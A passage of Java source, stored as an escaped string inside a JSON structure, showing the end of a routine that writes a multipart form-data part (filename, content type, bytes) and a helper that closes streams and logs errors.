dos.writeBytes(\"filename=\\\"\" + fileName + \"\\\"\\r\\n\");\n        }\n        String contentType = fileName == null ? \"text/plain\" : \"application/octet-stream\";\n        dos.writeBytes(\"Content-Type: \" + contentType + \"\\r\\n\");\n        dos.writeBytes(\"\\r\\n\");\n        dos.write(content);\n        dos.writeBytes(\"\\r\\n\");\n    }\n\n    private void closeStream(Closeable closeable) {\n        if (closeable != null) {\n            try {\n                closeable.close();\n            } catch (IOException e) {\n                logger.error(\"Error closing resource: \", e);\n            }\n        }\n    }\n}"
  }
]